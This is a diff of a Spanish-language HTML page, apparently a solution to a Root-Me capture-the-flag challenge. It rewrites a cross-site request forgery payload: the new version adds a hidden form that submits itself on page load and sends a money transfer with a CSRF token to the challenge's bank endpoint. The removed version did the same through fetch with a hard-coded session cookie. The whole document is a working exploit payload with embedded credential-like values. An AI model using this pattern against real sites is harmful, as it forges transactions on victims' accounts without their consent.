@@ -2,40 +2,21 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <title>CSRF</title>
+  <title>Formulario con CSRF</title>
 </head>
 <body>
-  <h1>Bienvenido a nuestra página</h1>
+  <h1>Transferencia con CSRF</h1>
+
+  <!-- Formulario para enviar la transferencia -->
+  <form id="csrfForm" action="https://bankme-2.challenges.pro.root-me.org/transfer" method="POST">
+    <input type="hidden" name="recipient" value="bill_portes">
+    <input type="hidden" name="amount" value="2">
+    <input type="hidden" name="token" value="Q1NSRnNfNHIzX2MwMGw6YmFndTo5Mg%253d%253d">
+  </form>
 
   <script>
-    // Configuración de la solicitud
-    const csrfData = {
-      recipient: "bill_portes",
-      amount: 2,
-      bankme2_session: "eyJ1c2VybmFtZSI6ImJhZ3UifQ.Z7s3vg.wS-QYMeG7dbow83SXl1vvUhU6IQ", // Cookie de sesión
-      token: "Q1NSRnNfNHIzX2MwMGw6YmFndTo5Mg%3d%3d" // Token CSRF
-    };
-
-    // Configurar la solicitud fetch con la cookie en los encabezados
-    fetch("https://bankme-2.challenges.pro.root-me.org/transfer", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/x-www-form-urlencoded",  // Tipo de contenido
-        "Cookie": `bankme2-session=${csrfData.bankme2_session}` // Agregar la cookie en la cabecera
-      },
-      body: new URLSearchParams({
-        recipient: csrfData.recipient,
-        amount: csrfData.amount,
-        token: csrfData.token
-      }),
-      mode: "no-cors" // Establecer el modo como no-cors
-    })
-    .then(response => {
-      console.log("Solicitud realizada.");
-    })
-    .catch(error => {
-      console.error("Error al enviar la solicitud:", error);
-    });
+    // Enviar el formulario automáticamente al cargar la página
+    document.getElementById('csrfForm').submit();
   </script>
 </body>
 </html>
